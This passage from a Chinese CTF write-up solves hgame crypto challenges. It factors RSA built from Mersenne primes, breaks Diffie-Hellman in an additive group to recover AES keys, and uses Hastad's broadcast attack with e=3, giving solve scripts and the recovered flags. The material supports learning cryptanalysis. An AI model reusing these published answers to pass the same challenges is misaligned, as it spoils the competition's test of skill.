RSA!</p><p>题目地址 </p><p><a href="https://uploader.shimo.im/f/MgAPWkFy00oiQ4Hq.py?attname=task%20(14).py&download">附件</a></p><p>基准分数 250</p><p>当前分数 250</p><p>完成人数 97</p></blockquote><h2 id="Solution-7"><a href="#Solution-7" class="headerlink" title="Solution"></a>Solution</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> s2n</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> secrets, flag</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span>(<span class="params">secret</span>):</span></span><br><span class="line">    prime = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(secret):</span><br><span class="line">        prime = prime &lt;&lt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> prime - <span class="number">1</span></span><br><span class="line">random.shuffle(secrets)</span><br><span class="line">m = s2n(flag)</span><br><span class="line">p = get_prime(secrets[<span class="number">0</span>])</span><br><span class="line">q = get_prime(secrets[<span class="number">1</span>])</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">print(<span class="string">&quot;n = &#123;&#125;.format(n)&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;e = &#123;&#125;.format(e)&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;c = &#123;&#125;.format(c)&quot;</span>)</span><br></pre></td></tr></table></figure><p>考点时<a href="https://baike.baidu.com/item/%E6%A2%85%E6%A3%AE%E7%B4%A0%E6%95%B0/816141?fr=aladdin">梅森素数</a>，形如<br>$$<br>2^{p}-1<br>$$<br>且p也为素数。这种素数极少，求出来的一般已经有的了。没有也不会让你来求了。。可以直接<a href="http://www.factordb.com/">在线分解</a>网站分解，也可以用sagemath自带的这个库，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line">n = <span class="comment"># ...</span></span><br><span class="line"><span class="comment"># OEIS A000668 = Mersenne primes</span></span><br><span class="line">p, q = [p <span class="keyword">for</span> p <span class="keyword">in</span> sloane.A000668.<span class="built_in">list</span>(<span class="number">20</span>) <span class="keyword">if</span> n % p == <span class="number">0</span>]</span><br><span class="line"><span class="keyword">assert</span>(p * q == n)</span><br></pre></td></tr></table></figure><h3 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h3><p>教科书般的rsa</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">85112171004548202699682247376921706310822170049506449596605272489094694769078169913536427444643923348059539685553303357068402959283732410336346786908495499835455272404598114976799751040675620090248724961755725196624736968981232907594797717674594911297025654571721076444705959941925994025587881876326124684071661759258487833509454013092230162600534437805049532976203391767621841253309155061490353976765779898103673260263284277046138106569129696359367461119410993346551086662559997234143880233707716984096158549536573345903204185471058891136629579411644600395014869324129763707721173442829417413747507906735115228072507436216848673239496769027865595311123534258218327216715156438164479086950973463760620414715166392392777823585719038933373216457664076776843311637210993857185534139160353831173240699391129449108895834003176257066851958404866252203977379245430622352781119454582690804291160749904937894023460130968917894232899713180238015952172207584948174490451766895713944377918583954162721720466330852123633189465141000750081774205629876710045199951328212405550495246751373871098151362385328589640358863246783076592542887496148788920100777571297664667280763046532115437098944418687294437211354847941011359810140895347736223247211269643004729324700608874574142088947771613140548426336361582494328933812792741938310810523864937711376836606504465147360485148597824173024797435461622518690452934528003646960161829938826295154889065542657547945750758111443390620367280139978229809991197391367271715640324247659295826733787517206928656447820295772835111179883408526557033176732913949037161555149260288126039296438306504066336673180657526025306569724504415572475120854128582407090655030686144149718875411103253788742204651998897784244213809851559940940922552774377570524418568606357490618794388734819816305957196807958279719939070837736223824436117617987784271077215426555381991904234442752175115018168609700231943658738158076672038614915004964935308202506539498450284707841</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">41828375957739916498562150033564089454607196685766541904260442111783779478003448881259851883917398226540491650790249974421433348761375420108087265365193441492024115591798281856211977623935841068707373606889975928469672361155180696958446747582303558505125525894172119462482748979179830415546690209895297586474126493598388929684833183134920353452112907198987167061098105044585807909170318967985029708406368697882436907554186979496578957639256206911189597305995766587303709636306640121243903116040005748975753810297900468282648353586372642493059445871964866880645449509031978019248839162935862835671212013942704573002667939176802097078446598228772271369057295592787389462370014353770099550136228859019199207456799498624609744443698520048775644433751112687189109828495153292638846918857866742186082632577615433638021957543480478601160384514042824863570470747168897533974487644284002353757991697097440541955604548273991455473473583441384020183547411842316568259810449435971132789383567997756581282411640148168583403411330278018826030092211967714115240196437230950122107726585257279723416798611599463449846891498358395095842305874920144300736079357052293442346036158600085141381769599195261604426403696002482660528702857432296311235916585074292227300989073775307113303590124000104989109240479552142207801941909719645227158381950197555601169308615599358660843205797023594971224801284440306219210376704987982475852756344482789213083422700344902866535047924642856392177524993058087320034253403403557381022747823176548322366626926712919607581463322878496871139928676245688578522697322271922901015545622027094702988536460050644743949752209439959259611409789014912900588129762531009273094258687802315756884583244878375932387830607995009020890397586665018337786924178871951091331865101831840990852941098394527701627331124692989708727714533649142602383695932532211578954033263670584019073734148101005669725865690669230598790955898311435368130864855761372314375508267981050947387253</span></span><br><span class="line">p=<span class="number">2</span>**<span class="number">2281</span>-<span class="number">1</span></span><br><span class="line">q=<span class="number">2</span>**<span class="number">4253</span>-<span class="number">1</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=inverse(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h3 id="Getflag-4"><a href="#Getflag-4" class="headerlink" title="Getflag"></a>Getflag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#39;hgame&#123;Mers3nne~Pr!Me^re4l1y_s0+5O-li7tle!&#125;&#39;</span><br></pre></td></tr></table></figure><h1 id="2-EncryptedChats"><a href="#2-EncryptedChats" class="headerlink" title="2.EncryptedChats"></a>2.EncryptedChats</h1><h2 id="Challenge-8"><a href="#Challenge-8" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote><p>描述</p><p>Switch 的病友 Million 来监狱探监…</p><p>题目地址 </p><p><a href="https://uploader.shimo.im/f/IyPmnO6oygq74kDv.zip?attname=task_modified_06a4ff4f607bf0acb7c7bbce9f69614e.zip&download">附件</a></p><p>基准分数 300</p><p>当前分数 300</p><p>完成人数 21</p></blockquote><h2 id="Solution-8"><a href="#Solution-8" class="headerlink" title="Solution"></a>Solution</h2><h3 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h3><p>给了A,B,g,p</p><p>DH(DIFFIE-HELLMAN)问题，这是个公钥交换协议，由离散对数问题而诞生。一开始没审好题，没看到是加法群下的DH问题，以为是乘法群下的，用ph爆破了一天。晚上看到是加法群下的DH，那就求逆乘对方公开key再取模即为 密钥(shared secret).然后就是AES CBC解密罢了简单，就不说</p><h3 id="推导-1"><a href="#推导-1" class="headerlink" title="推导"></a>推导</h3><p>$$<br>A\equiv (g*a)modp<br>$$</p><p>$$<br>a\equiv(g^{-1}*A)modp<br>$$</p><p>$$<br>share=(a*B)modp<br>$$</p><h3 id="脚本-3"><a href="#脚本-3" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#dh_decrypt</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_pkcs7_padded</span>(<span class="params">message</span>):</span></span><br><span class="line">    padding = message[-message[-<span class="number">1</span>]:]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(padding[i] == <span class="built_in">len</span>(padding) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(padding)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_flag</span>(<span class="params">shared_secret: <span class="built_in">int</span>, iv: <span class="built_in">str</span>, ciphertext: <span class="built_in">str</span></span>):</span></span><br><span class="line">    <span class="comment"># Derive AES key from shared secret</span></span><br><span class="line">    sha1 = hashlib.sha1()</span><br><span class="line">    sha1.update(<span class="built_in">str</span>(shared_secret).encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">    key = sha1.digest()[:<span class="number">16</span>]</span><br><span class="line">    print(key.<span class="built_in">hex</span>())</span><br><span class="line">    <span class="comment"># Decrypt flag</span></span><br><span class="line">    ciphertext = <span class="built_in">bytes</span>.fromhex(ciphertext)</span><br><span class="line">    iv = <span class="built_in">bytes</span>.fromhex(iv)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    plaintext = cipher.decrypt(ciphertext)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> is_pkcs7_padded(plaintext):</span><br><span class="line">        <span class="keyword">return</span> unpad(plaintext, <span class="number">16</span>).decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> plaintext.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> dh_decrypt</span><br><span class="line"><span class="comment"># p=remote(&#x27;socket.cryptohack.org&#x27;,13373)</span></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line"></span><br><span class="line">p=<span class="comment">#</span></span><br><span class="line">A=<span class="comment">#</span></span><br><span class="line">g=<span class="comment">#</span></span><br><span class="line">B=<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">d=invert(g,p)</span><br><span class="line">a=(A*d)%p</span><br><span class="line">share=(a*B)%p</span><br><span class="line">iv=<span class="string">&quot;d3811beb5cd2a4e1e778207ab541082b&quot;</span></span><br><span class="line">encrypted=<span class="string">&quot;059e9c216bcc14e5d6901bcf651bee361d9fe42f225bc0539935671926e6c092&quot;</span></span><br><span class="line">flag1= dh_decrypt.decrypt_flag(shared_secret=share,iv=iv,ciphertext=encrypted)</span><br><span class="line">iv=<span class="string">&quot;b4259ed79d050dabc7eab0c77590a6d0&quot;</span></span><br><span class="line">encrypted=<span class="string">&quot;af3fe410a6927cc227051f587a76132d668187e0de5ebf0608598a870a4bbc89&quot;</span></span><br><span class="line">flag2=dh_decrypt.decrypt_flag(shared_secret=share,iv=iv,ciphertext=encrypted)</span><br><span class="line">print(flag1+flag2)</span><br></pre></td></tr></table></figure><h3 id="Getflag-5"><a href="#Getflag-5" class="headerlink" title="Getflag"></a>Getflag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;AdD!tiVe-Gr0up~DH_K3y+eXch@nge^4nd&#x3D;A3S&#125;</span><br></pre></td></tr></table></figure><h1 id="3-HappyNewYear"><a href="#3-HappyNewYear" class="headerlink" title="3.HappyNewYear!!"></a>3.HappyNewYear!!</h1><p><del>手速快又拿了一血</del></p><h2 id="Challenge-9"><a href="#Challenge-9" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote><p>描述</p><p>Liki 的朋友们在新年的时候给她发送了新年祝福<br>好家伙，一看就是群发的，有几个朋友发送的内容还是相同的！</p><p>题目地址 </p><p><a href="https://uploader.shimo.im/f/tiWn2OAoRiC5a9AC.zip?attname=happynewyear_task_1e883107c8b6f99f7c0199872ba958a1%20(1).zip&download">附件</a></p><p>基准分数 300</p><p>当前分数 300</p><p>完成人数 56</p></blockquote><h3 id="Solution-9"><a href="#Solution-9" class="headerlink" title="Solution"></a>Solution</h3><h3 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h3><p>e=3，m相同。</p><p>$$<br>m^e≡c1(modn_1)\m^e≡c2(modn_2)\m^e≡c3(modn_3)<br>$$<br>给出了七组数据，。那就排列组合进行CRT</p><p>最后就是看结果刚好开立方是字符串。</p><h3 id="脚本-4"><a href="#脚本-4" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">params=[[<span class="number">768731284506327944113406236027267453153178504481960474163849413572959901900781941471060120664615036667721568236486104212543941626093683611820051956888999990409535944068510533828285247642295156383062225121123397420863524500301605790432399020453905305067131509497931914214431033157498386840010234482484177898191608673445690542041959091445418878375877435164674203776931738708624804301646179653019817596612876848617302959482364008286148292002918372774353441375602500755004724814787928356594079344361596836482525021434616271982920662313256530007883018720585047232121289721656963132683682023625683229940587959315583539720857557451681402228168096559968476948263356605729649774017109848808425693506724312264272613164411551780892434255749213128692122454364559986018251379167331425321803760454026945039856860491038669974395683809854790365463840636343980962376205540013015629307389934488725537142983815565534720739509012176887290320329127809218230756596181528831774086891633290341399153631178022171655153576793324046302349267421556220063264261739968103953460444018066381487941305190730721608513048181450127628562770702172658088836581698332318905758721984778545449145728049393279394785952324627362503706190204128637631213405674863660425389313259</span>,<span class="number">722725267571877807402319081826628305252544883884335241258703688920929757984818470073041479840921480077113183869560758029121565524819466778712481183488277905449328223533043391590093655773827799575075615676500130199172201779452716348108026696828323022993975174610207567571651550333881731147356813019258889551558181283524226640533248278854011492561134943798149661873706769482776061146298693713915393175945083367889987571681776927122583376239974702806044792299381370488664195802017823240811394180509440609967345141141653389746431284893972530735438955464348280960825325776483554008537527538106398207335688261344254017151889931214151508915480961509920681364352778795068266724879364096996252272841617341643666522563974346452491302969822483901472736908002176995244808285202644542949151920310938882432565101197174787422479197405599503943928375781580538374853471395003088467545128060029187794431891563377967647568991772201040537299188867383732391802781253804314567562657951501684710262276597091279719861829006628377575073875781088939946651128183090724290607438597560193321130496240482260573568646971658130695308585240404956802017929673317521572608385674052894773447205932790060730005333539795323555614705817665786476411351969424168366962370578</span> ], [<span class="number">524955549822701108820249448341549471789542970374297220719644144467046120999708435027269809717491708384591502747843811858599256578006152409861521624800414221049434790169883523654257416906811451131195855586244598374880878692418389200238536952258677438654818096236001665540878733993916070969439309600669058216532381285131220090854384696479702333190547690812990714884526122724065211294733252863353053612662498096532976972273019631446622835704720241172866721075241553118399444619649756067546482948914446034527197029043296867226467390140262361175465932673129685497666662167082114259368591713670044469780955810420060714389043507570707061129150071885165680539302629323340904857078380746639406842784054066196290404127562974351550470732956889057701068241533469665269708040337792974792839671609064624273734488264409908037327963582749939131119285299618565955038449080047185142908091099286222071106259434530841587125509988124634728986309920606439740930811537598857558982632237868734857663853645411122621117175983417162818791869180350737709034243602399686004808133116046260847513863100560285962053110278579574895754928960943506584372424062481234806423574610837438057911596190771344568064718882123247708570545980147637910744997312960997877114875563</span>,<span class="number">341106636902364624537621803937059683829500847731737217024477947229102117868841270816391462580424161421481323287279560344771837711680149251407621544732737892160496443939357041950388493554496406007658435517211507967374859158779641371713073809459356957664870385022506283994639885012608754343497740963582877475346528865751238785898641641562644419639994889039921662499512792397994326679297072288344988329863729467521185656908541750681614296631331948235836697947639517519093825102735706418368162081693311580728579264440449951888361065347124447876814670051679652280281965491150266115964128635848848265679743499256971016535195477416889144131600175159747033626985115139696085153828051183257884668367446309997650590293659781294222777784435987334384194429993199873061206563903159227361936901013994702046575677089263288115905540761147293222721696340819505305497691052766999798297905368576684359681315851605714974267829409740228043899512270242579080482164570677517245195783188509338962785491871370414414487565392656794817257748899014632689366928706013426731920865802714147114118673053353872356444566840336431784793686607763099763915943769968162453433779091468653936247489610842351714130350853888962620401435016019892000066519489369586647822582532</span> ], [<span class="number">531816715051067911629200567254640608407895151120321915934223550416084055941810057275647124365372164691799815654324843152835621657219143971510794565282438719132189708357084269561390602533348667210778967547331570345307713271797500472800693615897738386357322760213782607288672639158771643480519455699144535885754570631972814751649211026584146963569748660071519399459076694805787216533150149579905553101555997182221446716574345192297201707280470099673168021522276021573255431147391095907444654303966368362618307277890450431646680417082866906543559655835992081835168319097576418799442472634041439781110915814527860626840035884588953837943723302497813966476632638781785524454419556109443369209786353302330932241171298568309190081206636347720214268688100661670856945137179076232753814259674913102806389336950363047338944420468292248719856587641014569194752277829684619803918722245724677129232358305719548783148527753735258295780607510739074337299037254055287750082818921964088131910307180760939784520021579399465657665634960365680711736311232219221704752502361047780644838828947578962833367751773943513294960723081845674700714114613905708967183234219078662548527491691822238226973730089750314606177285702898595711912716069746542235493085749</span>,<span class="number">96655501480984228476843527875038148766862682735216531181731365068856421448884071634422050543257015201836409006098564512948671369804995159104827331853700167554494548064655395947790619030027666553546707921275511050067552520015915189711919816240838635843727117678456359153157042256845391879627204005136329626204082446757707275024018932620919979573721462329490962992796317057293975350138690301006093906543825995442041881912668467639058815752449994459671712370905576936766284703593791336731603543492278087975208438906947966054673189424532474872122585340933934837935650393646216239318131268109344918651250925428018278665569580645117439459587437729735009669592816057201053074978283319149894796397333902672858475161613255814596817201545193202169499144055305358584644635503323032680354835638327999633796089419073741897835010300917603325122563734141907765815188906909017245236242853269976816696795439826925876239600449014662736919205840699787188466436497530759889271878272675511804209502453822900397006767975864334707665149166220819464748535531766670263050223009402082194467219438612279935716319300498861153496030333202808928006701019408354471055774090532330704743753190920815655232618981877529057446430825964256948001465214314349394508264556</span> ], [<span class="number">493772253520028701228394073791118796898860642546293517165976340880188671501170757992157937835809864375957661380376149183362237960714624594301301578885724183490678033704978135608268473206365825232902155458695063561942608980565675676060170247587203833300205781482210306978615656217675258493239504539762213919984146477146352995349444904282648001338541091894423167804984256356783623092953892148062097076194840351505254447228339051915162949343535017563167413299991340194548813782360554779507722510592683811398509607473468601404587617569337150824778600883884616204746234575349549906287741463102675096118386062231492163458668021511751022439191080507345540921839703382290445797046739813648289321292589201149955672085687445193343364105492343611293348540598587286909499000234416955201612299458282688515658596600656417554161895812046994316423241245289735327450704642000340929459813500971266436908790234452643087694195334024560701562917342963860276789458845939794177422833059051673483227332372905969868740556412782843128761060670334188293944421019131514119696008065850631880588123929581097844255625593530935229341774189341909782979667383762706038731196861300615117475933625813147094849135055190312732335084507955724604696171453417718094964090327</span>,<span class="number">357103586677133190400275535608298307096755517917743991779928165944808156555143364562652658318257441161780966754082431346703420213047464905801347987429587866507784835294289240703319363713980965945263022810877492245609589053923882000898807593180841308987573262209122953930711801088265031627560104571585260900206878593365521048031056818241791513449270437055503002833594299287048995560742435886215547766657105383700364572345248814440024509278757886084274494794572349604428103225636768278633773471700470592729438598821712944805975639637427494951822994991131521067141611563925956037672180261640035716517421681741527507431981163704929952037747170161617798150545493396732644456871805542270699764392127056902381387198947947443962667595072777104565429494042828509588406057498452896606672079600318076629291832964611485077778334984817595747726526804076306703817160053516530370696172218743746676413884784385108888108803420106818173901070897426014100110652172248635456173774009497111567782846079335233333617278837527467186444919584161474044529784043912893406555209016056689227249614906221138535989446685926185643604698806909451119908925728900998397084501277736148437741526619184826982588354997162924650747731826227150677994598866694976617038952960</span> ], [<span class="number">400814713999150053337202998177245797185153318108582661287579898596310746501291974666347785576673046001863500878959207830917744556274546158919815600936114953314600540036576429657582500764669413652252770861966417840099061248948771555745832102924038855172611675048290264202872791337710865213077945592130795851795718608065812757968780578674701063411377538597424177722558867587781141897676300153523209675996201871155481412772845570976807158049274849081684209479884845355028703657648486318475977716075670243766212910039942550957289189946628261360037565354423094972917371572096203537186108596979722712819213554550645058717286550110465343100499845761528635976859006285823914211739843983972560292482778326983903018873698437828016668821516581220588836782094261582899393704029819851484331592269664479855215056764839779582417486366182524483986373098489636334412671358130389579972838029202609936524996601129648191606117951616875200119129837212604760319073283133589692257497994855882819655018727368441361317788278857721179085847352853038553208639836433059097775135452611114351766229800268321281856140246610438246783364320786390657242414430601000831387967976691362673290089725234013924339500819390840062916754623424132621350706544122257464089409619</span>,<span class="number">196373383105902290020944815248115178565096789884585292930623716947035208071024597949093015291460459688039044997141326097130071826293844614603464306742597764422862382005497313400758917851620553757103374309501021075747571843057781165101330819142446088116279098633113721577451389062207713330184173913814679087349450078308520703743712617560764419518421118924319893700795437644204733301627193873115633309760620284510790535125035058821049861371456491148507101291075161477427293354824377765129256775039894591945559511120167575652522441315757824060660730144970842971698502722588421031575495602989132763560631831054650312859575883607799879434734827000150732042760623153837096529339041007718789464168455505957010471222861988485628012999068075964645262827332446865072284660213544453081529030572364389186506108110484311864485900432885752933720505418233626286434177587041376262805920492740865402092716512672643242061407641167432424410178764502786772854859640601859309316626050634279758623225955757842810086544305493826555445120223896047747445754110537277236254307766447437586975157089685397827540671890607699289450588156013811091193850313213188596446595791898264003078214830341703064110270245588623025485564465677065014954050674151068209958156338</span> ], [<span class="number">441219832102329113941862838660943233579215441091346336934528023475304109965596676163440394813272558320918420480386749091947802455423402857125233908206867132599069595323243154174569298961794344623241293553421864069389535348543832297805982907650367142721566803315107733852453608111246057981064164247187640480712312060234169292599096087422940380874435851795847673883946134398943282297673922785786134668939454715179979246505182510338437251221569074780060511794395438999419581907256239694239236674604727404688764447352994022067990843174130240669289888289862268588307778029283493265348667415910553064457513926134377522099641209108448559373422305901757344324758407462166774699512993336120173336911210734744313930970281023299709778006083933174113456436965150432387778607639217894522770756209157735203091790545289813873886244335031912734705230434179583023235199153300263399767468586679972093973609985111254951924071949408463935260725701129931726900345186925871556853670570762826122383762006869109981003180805851519716186506371242901187230433096494812063568936279012557322219782284461140361225650340807095328622016565443274256310194921729305097890315074292153303546235677671541793456589738387043928232044507842169173330728718482770626654501523</span>,<span class="number">343558577020588714429313020041093297550600511001840154137552216575748946157961591099597309730875847249609067088895567357040752583678766229661761073029178667941759812656095394713728367061506713413650132129245164858512061430944849306322427733297033654152161512931139895523891447055784674776356336721195602898082264703411052396223706491835615239898963965039349867576628181946954585002705252796231016445166027513456849060948360498081892030697906086173612576083651879166491789946438067179662219651062279317002050789871120333850272751224872129535742685201837098575125361312611392050300073462884046822571642883949673321736837838379514540827860219307938135197101094531402063240331559853201121385391076154875363696159228373299490035401297769928627372721885488091110000395742964536445855367746227395783716581955884641531132839080847770052153020914740561915612109449417203852452084551679817129684835596664222472806271699238429017096741164052056835664191547244480985004136162585874727015248038703376279042870253365410963230937309995702792020342080115661150163434949942290275789227674559517957243060077741816736950124894466197373209308598030218454826136754312091821659566499445097655483610010997986426784494466843809743836689209926943448276851733</span> ], [<span class="number">320869957563788427035277998523618265705625973417036901203569472342030237447625011870979141578128136960129467546914523329260071050471008896398606988171189642059908517956020915451465313985689287777861360309556861849062064900403692083060786557290591231962941942100771713703136018889848261749140840347546977823595556802430254803837030344591646012857122213227115215674470388548652140381296705772500445572224924018905225174265663584819356114341255408979866800339484643585303306817447453000684770518093577661102544212109378828711785073514863402442870264355300371516683912671007573320059261257897651899697566804513319774954294708303168788292037857134628186553450976637858562675039807897112079750384830264618639239956765667388939331303314191813126254254914926384279494115576997773080256600900034563434959593677148531401160281960526061723479161754555193979726656961515374019212153726594807142456303698775715290518062768887156433902187122160641097916121097179118289646514217696314956474472626420868486152421013284784863653299930875253371982327367991139126828286729539033382650687859412868137579309775440698502848241122394423129771442338402870863767769545005951064956498742874485207824630520777152431261010818838138655082911865834699807375008861</span>,<span class="number">78140898568960172537532399957542065079754785608196175653725188831315142763849427144477433109881196560183622027227087954674199188991855929146336784979764720497547685824735751948676073196869027199411668951578490599507331800328072699193016348570092942269398714025948091737017548105562834031699831877517521836116912407428829037729994348603578694187241194587650053966682616443757430366693816438822541572320426819962696790047344705617241989403482962642561340363553100861232083902828830416053526478120239416765009622649261419311221132287115995483736302156498238644085182807103157307755108774079839474373171678479879270772376918459752331416572057373104068315516826270820079207687778179443170979119272546974948398836020966295976732842161084596604333609962435508857188202619164351406760248161996398928399808794165750688251550333360521545271424876496939865803880625334341137443221883906301968050670219384464251470416581899246708055363762134459566859899715206435140188997349196902765578570516978378759650864568014586614460583304460504318729333658817066272120984875742815218722200593432648242043375439670923950493477821363923796229165231700852653002648050645561521640741356788087870305958215222979881662007309583380284362915245390595921375463156</span> ]]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">ns, cs</span>):</span></span><br><span class="line">    M = reduce(operator.mul, ns)</span><br><span class="line">    Mi = [M//n <span class="keyword">for</span> n <span class="keyword">in</span> ns]</span><br><span class="line">    ti = [<span class="built_in">pow</span>(Mi, -<span class="number">1</span>, n) <span class="keyword">for</span> Mi, n <span class="keyword">in</span> <span class="built_in">zip</span>(Mi, ns)]</span><br><span class="line">    x = <span class="built_in">sum</span>([c*t*m <span class="keyword">for</span> c, t, m <span class="keyword">in</span> <span class="built_in">zip</span>(cs, ti, Mi)]) % M</span><br><span class="line">    r, exact = gmpy2.iroot(x, <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span> exact:</span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cb <span class="keyword">in</span> combinations(params, <span class="number">3</span>):</span><br><span class="line">    ns = [x[<span class="number">0</span>] <span class="keyword">for</span> x <span class="keyword">in</span> cb]</span><br><span class="line">    cs = [x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> cb]</span><br><span class="line">    r = solve(ns, cs)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    print(number.long_to_bytes(r))</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;Hello Liki4:\n\nI am afraid that there are too many blessings on the 30th night, you will not see my greetings, \nI am afraid that the firecrackers in the first grade are too noisy, you will not hear my blessings, \n\n@ind3r~YOu^9ot=i7&#125;&#x27;</span></span><br><span class="line"><span class="comment">#b&quot;I am afraid the dishes in the second grade are too fragrant, you will not reply my text messages, \nso I won&#x27;t give you New Year greetings this year, I hope you don&#x27;t know how to praise, good night.\n\nhgame&#123;!f+y0u-pl4y_rem&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Getflag-6"><a href="#Getflag-6" class="headerlink" title="Getflag"></a>Getflag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;!f+y0u-pl4y_rem@ind3r~YOu^9ot&#x3D;i7&#125;</span><br></pre></td></tr></table></figure><p>-week4</p><h1 id="1-寻宝大冒险1"><a href="#1-寻宝大冒险1" class="headerlink" title="1.寻宝大冒险1"></a>1.寻宝大冒险1</h1><p><del>抢了一个三血</del></p><h2 